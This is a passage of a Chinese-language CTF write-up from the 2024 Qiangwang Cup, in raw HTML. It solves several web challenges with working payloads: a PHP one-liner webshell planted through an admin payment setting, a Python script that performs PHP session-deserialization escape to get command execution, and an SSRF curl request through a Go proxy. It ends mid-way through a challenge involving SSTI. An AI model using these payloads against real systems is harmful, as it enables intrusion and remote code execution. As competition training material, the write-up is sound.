</span></span><span class=line><span class=cl>[10:15:31] 200 -    2KB - /search.jsp
</span></span><span class=line><span class=cl>[10:15:31] 200 -    2KB - /search_admin
</span></span><span class=line><span class=cl>[10:15:31] 200 -    2KB - /searchreplacedb2.php                             
</span></span><span class=line><span class=cl>[10:15:31] 200 -    2KB - /searchresults.aspx                               
</span></span><span class=line><span class=cl>[10:15:31] 200 -    2KB - /searchresults.html
</span></span><span class=line><span class=cl>[10:15:31] 200 -    2KB - /searchresults.php
</span></span><span class=line><span class=cl>[10:15:31] 200 -    2KB - /searchresults.js
</span></span><span class=line><span class=cl>[10:15:31] 200 -    2KB - /searchreplacedb2cli.php
</span></span><span class=line><span class=cl>[10:15:31] 200 -    2KB - /searchresults.jsp
</span></span></code></pre></td></tr></table></div></div><p>扫的确实慢了点不过心急吃不了热豆腐，接着搞，发现<code>admin/Admins</code>，这里发现支付可以添加PHP代码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/admin/payment/index.html
</span></span></code></pre></td></tr></table></div></div><p>直接添加一句话木马，但是我发现有个小细节就是必须加不能报错和引号，不然就无法使用，加完直接返回漫画主页就已经getshell了</p><p>难得就在于拿到<code>admin/Admins</code>这个路由，御剑是可以爆破出来的</p><h2 id=platform>platform</h2><p>扫出来源码<code>www.zip</code></p><p>拿到之后是一个PHP。我们慢慢看</p><p><img src=/p/qiangwang-cup-2024/QQ20241103-001006.png width=1370 height=1212 loading=lazy alt=1></p><p>看到这里之后发现直接就是在<code>class.php</code>，但是有session，可能有竞争？</p><p>后来想想这里不是有个空值嘛</p><p><img src=/p/qiangwang-cup-2024/QQ20241103-091841.png width=1282 height=792 loading=lazy alt=1></p><p>经过测试发现怎么弄都会是56个字符</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&#34;;session_key|s:20:&#34;FIzIiMb901w1XCmMXvui&#34;;password|s:99:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&#34;;session_key|s:19:&#34;kkTEOXdlrTsA7fOnDWI&#34;;password|s:106:
</span></span></code></pre></td></tr></table></div></div><p>于是这里我们进行逃逸即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;passthru&#34;</span><span class=o>*</span><span class=mi>7</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>然后再插入我们的session序列化poc</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>;session_key|O:15:&#34;notouchitsclass&#34;:1:{s:4:&#34;data&#34;;s:24:&#34;(&#34;sys&#34;.&#34;tem&#34;)($_GET[a]);&#34;;}password|s:2:&#34;wi
</span></span></code></pre></td></tr></table></div></div><p>当然这里如果是脚本的话肯定是要http头的</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>headers</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;Accept&#39;</span><span class=p>:</span> <span class=s1>&#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;Accept-Language&#39;</span><span class=p>:</span> <span class=s1>&#39;zh-CN,zh;q=0.9&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;Cache-Control&#39;</span><span class=p>:</span> <span class=s1>&#39;no-cache&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;Content-Type&#39;</span><span class=p>:</span> <span class=s1>&#39;application/x-www-form-urlencoded&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;Pragma&#39;</span><span class=p>:</span> <span class=s1>&#39;no-cache&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;Proxy-Connection&#39;</span><span class=p>:</span> <span class=s1>&#39;keep-alive&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;Upgrade-Insecure-Requests&#39;</span><span class=p>:</span> <span class=s1>&#39;1&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;User-Agent&#39;</span><span class=p>:</span> <span class=s1>&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>params</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;a&#39;</span><span class=p>:</span> <span class=s2>&#34;/readflag&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>data</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=s1>&#39;password&#39;</span><span class=p>:</span> <span class=s1>&#39;;session_key|O:15:&#34;notouchitsclass&#34;:1:{s:4:&#34;data&#34;;s:24:&#34;(&#34;sys&#34;.&#34;tem&#34;)($_GET[a]);&#34;;}password|s:2:&#34;wi&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=s1>&#39;username&#39;</span><span class=p>:</span> <span class=s1>&#39;passthrupassthrupassthrupassthrupassthrupassthrupassthru&#39;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://eci-2zebwi4k2x5ugkdi45iw.cloudeci1.ichunqiu.com/&#34;</span>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>session</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>response1</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>+</span><span class=s1>&#39;/index.php&#39;</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>,</span> <span class=n>verify</span><span class=o>=</span><span class=kc>False</span><span class=p>,</span> <span class=n>allow_redirects</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>response2</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>+</span><span class=s1>&#39;/index.php&#39;</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>,</span><span class=n>verify</span><span class=o>=</span><span class=kc>False</span><span class=p>,</span> <span class=n>allow_redirects</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>response3</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span> <span class=o>+</span> <span class=s1>&#39;/dashboard.php&#39;</span><span class=p>,</span><span class=n>params</span><span class=o>=</span><span class=n>params</span><span class=p>,</span><span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>,</span> <span class=n>verify</span><span class=o>=</span><span class=kc>False</span><span class=p>,</span> <span class=n>allow_redirects</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s2>&#34;flag&#34;</span> <span class=ow>in</span> <span class=n>response3</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>response3</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>cookies</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>response3</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>cookies</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=proxy>Proxy</h2><p>有源码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span><span class=lnt>88
</span><span class=lnt>89
</span><span class=lnt>90
</span><span class=lnt>91
</span><span class=lnt>92
</span><span class=lnt>93
</span><span class=lnt>94
</span><span class=lnt>95
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-go data-lang=go><span class=line><span class=cl><span class=kn>package</span> <span class=nx>main</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;bytes&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;io&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;net/http&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;os/exec&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=s>&#34;github.com/gin-gonic/gin&#34;</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>type</span> <span class=nx>ProxyRequest</span> <span class=kd>struct</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nx>URL</span>             <span class=kt>string</span>            <span class=s>`json:&#34;url&#34; binding:&#34;required&#34;`</span>
</span></span><span class=line><span class=cl>	<span class=nx>Method</span>          <span class=kt>string</span>            <span class=s>`json:&#34;method&#34; binding:&#34;required&#34;`</span>
</span></span><span class=line><span class=cl>	<span class=nx>Body</span>            <span class=kt>string</span>            <span class=s>`json:&#34;body&#34;`</span>
</span></span><span class=line><span class=cl>	<span class=nx>Headers</span>         <span class=kd>map</span><span class=p>[</span><span class=kt>string</span><span class=p>]</span><span class=kt>string</span> <span class=s>`json:&#34;headers&#34;`</span>
</span></span><span class=line><span class=cl>	<span class=nx>FollowRedirects</span> <span class=kt>bool</span>              <span class=s>`json:&#34;follow_redirects&#34;`</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>func</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nx>r</span> <span class=o>:=</span> <span class=nx>gin</span><span class=p>.</span><span class=nf>Default</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nx>v1</span> <span class=o>:=</span> <span class=nx>r</span><span class=p>.</span><span class=nf>Group</span><span class=p>(</span><span class=s>&#34;/v1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>v1</span><span class=p>.</span><span class=nf>POST</span><span class=p>(</span><span class=s>&#34;/api/flag&#34;</span><span class=p>,</span> <span class=kd>func</span><span class=p>(</span><span class=nx>c</span> <span class=o>*</span><span class=nx>gin</span><span class=p>.</span><span class=nx>Context</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=nx>cmd</span> <span class=o>:=</span> <span class=nx>exec</span><span class=p>.</span><span class=nf>Command</span><span class=p>(</span><span class=s>&#34;/readflag&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>			<span class=nx>flag</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>cmd</span><span class=p>.</span><span class=nf>CombinedOutput</span><span class=p>()</span>
</span></span><span class=line><span class=cl>			<span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>				<span class=nx>c</span><span class=p>.</span><span class=nf>JSON</span><span class=p>(</span><span class=nx>http</span><span class=p>.</span><span class=nx>StatusInternalServerError</span><span class=p>,</span> <span class=nx>gin</span><span class=p>.</span><span class=nx>H</span><span class=p>{</span><span class=s>&#34;status&#34;</span><span class=p>:</span> <span class=s>&#34;error&#34;</span><span class=p>,</span> <span class=s>&#34;message&#34;</span><span class=p>:</span> <span class=s>&#34;Internal Server Error&#34;</span><span class=p>})</span>
</span></span><span class=line><span class=cl>				<span class=k>return</span>
</span></span><span class=line><span class=cl>			<span class=p>}</span>
</span></span><span class=line><span class=cl>			<span class=nx>c</span><span class=p>.</span><span class=nf>JSON</span><span class=p>(</span><span class=nx>http</span><span class=p>.</span><span class=nx>StatusOK</span><span class=p>,</span> <span class=nx>gin</span><span class=p>.</span><span class=nx>H</span><span class=p>{</span><span class=s>&#34;flag&#34;</span><span class=p>:</span> <span class=nx>flag</span><span class=p>})</span>
</span></span><span class=line><span class=cl>		<span class=p>})</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nx>v2</span> <span class=o>:=</span> <span class=nx>r</span><span class=p>.</span><span class=nf>Group</span><span class=p>(</span><span class=s>&#34;/v2&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>v2</span><span class=p>.</span><span class=nf>POST</span><span class=p>(</span><span class=s>&#34;/api/proxy&#34;</span><span class=p>,</span> <span class=kd>func</span><span class=p>(</span><span class=nx>c</span> <span class=o>*</span><span class=nx>gin</span><span class=p>.</span><span class=nx>Context</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=kd>var</span> <span class=nx>proxyRequest</span> <span class=nx>ProxyRequest</span>
</span></span><span class=line><span class=cl>			<span class=k>if</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>c</span><span class=p>.</span><span class=nf>ShouldBindJSON</span><span class=p>(</span><span class=o>&amp;</span><span class=nx>proxyRequest</span><span class=p>);</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>				<span class=nx>c</span><span class=p>.</span><span class=nf>JSON</span><span class=p>(</span><span class=nx>http</span><span class=p>.</span><span class=nx>StatusBadRequest</span><span class=p>,</span> <span class=nx>gin</span><span class=p>.</span><span class=nx>H</span><span class=p>{</span><span class=s>&#34;status&#34;</span><span class=p>:</span> <span class=s>&#34;error&#34;</span><span class=p>,</span> <span class=s>&#34;message&#34;</span><span class=p>:</span> <span class=s>&#34;Invalid request&#34;</span><span class=p>})</span>
</span></span><span class=line><span class=cl>				<span class=k>return</span>
</span></span><span class=line><span class=cl>			<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>			<span class=nx>client</span> <span class=o>:=</span> <span class=o>&amp;</span><span class=nx>http</span><span class=p>.</span><span class=nx>Client</span><span class=p>{</span>
</span></span><span class=line><span class=cl>				<span class=nx>CheckRedirect</span><span class=p>:</span> <span class=kd>func</span><span class=p>(</span><span class=nx>req</span> <span class=o>*</span><span class=nx>http</span><span class=p>.</span><span class=nx>Request</span><span class=p>,</span> <span class=nx>via</span> <span class=p>[]</span><span class=o>*</span><span class=nx>http</span><span class=p>.</span><span class=nx>Request</span><span class=p>)</span> <span class=kt>error</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>					<span class=k>if</span> <span class=p>!</span><span class=nx>req</span><span class=p>.</span><span class=nx>URL</span><span class=p>.</span><span class=nf>IsAbs</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>						<span class=k>return</span> <span class=nx>http</span><span class=p>.</span><span class=nx>ErrUseLastResponse</span>
</span></span><span class=line><span class=cl>					<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>					<span class=k>if</span> <span class=p>!</span><span class=nx>proxyRequest</span><span class=p>.</span><span class=nx>FollowRedirects</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>						<span class=k>return</span> <span class=nx>http</span><span class=p>.</span><span class=nx>ErrUseLastResponse</span>
</span></span><span class=line><span class=cl>					<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>					<span class=k>return</span> <span class=kc>nil</span>
</span></span><span class=line><span class=cl>				<span class=p>},</span>
</span></span><span class=line><span class=cl>			<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>			<span class=nx>req</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>http</span><span class=p>.</span><span class=nf>NewRequest</span><span class=p>(</span><span class=nx>proxyRequest</span><span class=p>.</span><span class=nx>Method</span><span class=p>,</span> <span class=nx>proxyRequest</span><span class=p>.</span><span class=nx>URL</span><span class=p>,</span> <span class=nx>bytes</span><span class=p>.</span><span class=nf>NewReader</span><span class=p>([]</span><span class=nb>byte</span><span class=p>(</span><span class=nx>proxyRequest</span><span class=p>.</span><span class=nx>Body</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>			<span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>				<span class=nx>c</span><span class=p>.</span><span class=nf>JSON</span><span class=p>(</span><span class=nx>http</span><span class=p>.</span><span class=nx>StatusInternalServerError</span><span class=p>,</span> <span class=nx>gin</span><span class=p>.</span><span class=nx>H</span><span class=p>{</span><span class=s>&#34;status&#34;</span><span class=p>:</span> <span class=s>&#34;error&#34;</span><span class=p>,</span> <span class=s>&#34;message&#34;</span><span class=p>:</span> <span class=s>&#34;Internal Server Error&#34;</span><span class=p>})</span>
</span></span><span class=line><span class=cl>				<span class=k>return</span>
</span></span><span class=line><span class=cl>			<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>			<span class=k>for</span> <span class=nx>key</span><span class=p>,</span> <span class=nx>value</span> <span class=o>:=</span> <span class=k>range</span> <span class=nx>proxyRequest</span><span class=p>.</span><span class=nx>Headers</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>				<span class=nx>req</span><span class=p>.</span><span class=nx>Header</span><span class=p>.</span><span class=nf>Set</span><span class=p>(</span><span class=nx>key</span><span class=p>,</span> <span class=nx>value</span><span class=p>)</span>
</span></span><span class=line><span class=cl>			<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>			<span class=nx>resp</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>client</span><span class=p>.</span><span class=nf>Do</span><span class=p>(</span><span class=nx>req</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>			<span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>				<span class=nx>c</span><span class=p>.</span><span class=nf>JSON</span><span class=p>(</span><span class=nx>http</span><span class=p>.</span><span class=nx>StatusInternalServerError</span><span class=p>,</span> <span class=nx>gin</span><span class=p>.</span><span class=nx>H</span><span class=p>{</span><span class=s>&#34;status&#34;</span><span class=p>:</span> <span class=s>&#34;error&#34;</span><span class=p>,</span> <span class=s>&#34;message&#34;</span><span class=p>:</span> <span class=s>&#34;Internal Server Error&#34;</span><span class=p>})</span>
</span></span><span class=line><span class=cl>				<span class=k>return</span>
</span></span><span class=line><span class=cl>			<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>			<span class=k>defer</span> <span class=nx>resp</span><span class=p>.</span><span class=nx>Body</span><span class=p>.</span><span class=nf>Close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>			<span class=nx>body</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>io</span><span class=p>.</span><span class=nf>ReadAll</span><span class=p>(</span><span class=nx>resp</span><span class=p>.</span><span class=nx>Body</span><span class=p>)</span>
</span></span><span class=line><span class=cl>			<span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>				<span class=nx>c</span><span class=p>.</span><span class=nf>JSON</span><span class=p>(</span><span class=nx>http</span><span class=p>.</span><span class=nx>StatusInternalServerError</span><span class=p>,</span> <span class=nx>gin</span><span class=p>.</span><span class=nx>H</span><span class=p>{</span><span class=s>&#34;status&#34;</span><span class=p>:</span> <span class=s>&#34;error&#34;</span><span class=p>,</span> <span class=s>&#34;message&#34;</span><span class=p>:</span> <span class=s>&#34;Internal Server Error&#34;</span><span class=p>})</span>
</span></span><span class=line><span class=cl>				<span class=k>return</span>
</span></span><span class=line><span class=cl>			<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>			<span class=nx>c</span><span class=p>.</span><span class=nf>Status</span><span class=p>(</span><span class=nx>resp</span><span class=p>.</span><span class=nx>StatusCode</span><span class=p>)</span>
</span></span><span class=line><span class=cl>			<span class=k>for</span> <span class=nx>key</span><span class=p>,</span> <span class=nx>value</span> <span class=o>:=</span> <span class=k>range</span> <span class=nx>resp</span><span class=p>.</span><span class=nx>Header</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>				<span class=nx>c</span><span class=p>.</span><span class=nf>Header</span><span class=p>(</span><span class=nx>key</span><span class=p>,</span> <span class=nx>value</span><span class=p>[</span><span class=mi>0</span><span class=p>])</span>
</span></span><span class=line><span class=cl>			<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>			<span class=nx>c</span><span class=p>.</span><span class=nx>Writer</span><span class=p>.</span><span class=nf>Write</span><span class=p>(</span><span class=nx>body</span><span class=p>)</span>
</span></span><span class=line><span class=cl>			<span class=nx>c</span><span class=p>.</span><span class=nf>Abort</span><span class=p>()</span>
</span></span><span class=line><span class=cl>		<span class=p>})</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nx>r</span><span class=p>.</span><span class=nf>Run</span><span class=p>(</span><span class=s>&#34;127.0.0.1:8769&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=/p/qiangwang-cup-2024/QQ20241103-112855.png width=1379 height=338 loading=lazy alt=1></p><p>得到发包格式</p><p><img src=/p/qiangwang-cup-2024/QQ20241103-113006.png width=2081 height=555 loading=lazy alt=1></p><p>这里直接就可以拿到flag，那我们直接<code>curl</code>发包</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>root@dkcjbRCL8kgaNGz:~# curl -X POST http://47.94.231.2:30773/v2/api/proxy \
</span></span><span class=line><span class=cl>-H &#34;Content-Type: application/json&#34; \
</span></span><span class=line><span class=cl>-d &#39;{
</span></span><span class=line><span class=cl>    &#34;url&#34;: &#34;http://127.0.0.1:8769/v1/api/flag&#34;,
</span></span><span class=line><span class=cl>    &#34;method&#34;: &#34;POST&#34;,
</span></span><span class=line><span class=cl>    &#34;body&#34;: &#34;&#34;,
</span></span><span class=line><span class=cl>    &#34;headers&#34;: {},
</span></span><span class=line><span class=cl>    &#34;follow_redirects&#34;: false
</span></span><span class=line><span class=cl>}&#39;
</span></span><span class=line><span class=cl>{&#34;flag&#34;:&#34;ZmxhZ3s1ZWRlMjYzYi0xZjAzLTRhNGYtYTUyMC1jNGM4ZjE3MzYyOWF9&#34;}
</span></span></code></pre></td></tr></table></div></div><p>然后解码即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>flag{5ede263b-1f03-4a4f-a520-c4c8f173629a}
</span></span></code></pre></td></tr></table></div></div><h2 id=snake>snake</h2><p>进来是个贪吃蛇，肯定是要通关才能够拿到<code>flag</code>，那么我们爆破爬取路由</p><p>拿到<code>/snake_win</code></p><p><img src=/p/qiangwang-cup-2024/QQ20241103-120440.png width=1476 height=715 loading=lazy alt=1></p><p>测出有sql注入漏洞，尝试注入之后没有结果</p><p>响应头也没说是什么web服务，测试了很久发现可以<code>ssti</code></p><p><img src=/p/qiangwang-cup-2024/QQ20241103-121106.png width=1857 height=735 loading=lazy alt=1></p><p>man，flag终于是要到我手里了嘛</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
